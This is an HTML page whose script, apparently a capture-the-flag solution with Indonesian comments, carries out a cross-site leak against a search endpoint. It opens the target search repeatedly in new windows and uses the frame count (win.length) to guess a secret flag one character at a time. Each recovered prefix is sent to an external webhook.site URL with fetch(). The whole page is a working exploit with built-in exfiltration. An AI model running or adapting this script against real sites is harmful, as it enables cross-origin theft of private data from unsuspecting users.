<!DOCTYPE html>
<html>

<body>
    <script>
        const target = "https://ponder.cbd2026.cloud/search?q=";
        const webhook = "https://webhook.site/76c1a3f4-7985-4c73-9f7d-1d28bae13e25"; // GANTI DENGAN URL WEBHOOK-MU
        let flag = "flag{";
        const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_}";

        async function leak(char) {
            return new Promise((resolve) => {
                // Membuka jendela pencarian untuk menebak karakter selanjutnya
                let win = window.open(`${target}${flag}${char}`);

                // Menunggu halaman dimuat sepenuhnya
                setTimeout(() => {
                    // Jika single_match=True, biasanya win.length akan bernilai 1 (karena iframe)
                    const isMatch = win.length === 1;
                    win.close();
                    resolve(isMatch);
                }, 600);
            });
        }

        async function start() {
            for (let char of alphabet) {
                if (await leak(char)) {
                    flag += char;
                    // Kirim progres ke webhook
                    fetch(`${webhook}?found=${encodeURIComponent(flag)}`);

                    if (char === "}") return; // Flag selesai
                    return start(); // Cari karakter berikutnya
                }
            }
        }

        start();
    </script>
</body>

</html>
